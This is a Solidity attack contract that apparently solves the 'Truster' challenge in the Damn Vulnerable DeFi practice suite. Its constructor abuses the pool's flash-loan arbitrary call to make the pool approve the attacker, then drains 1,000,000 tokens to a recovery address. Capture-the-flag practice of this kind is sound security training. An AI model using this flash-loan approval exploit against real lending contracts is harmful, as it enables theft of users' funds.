// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";


contract Attacker {

    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;
        bytes memory approve = abi.encodeCall(ERC20.approve, (address(this), 1_000_000e18));

        pool.flashLoan(0, recovery, address(token), approve);
        token.transferFrom(address(pool), recovery, 1_000_000e18 );
    }

    // receive() external payable {}

    // fallback() external payable {
    //     token.approve(recovery, 1_000_000e18);
    // }

}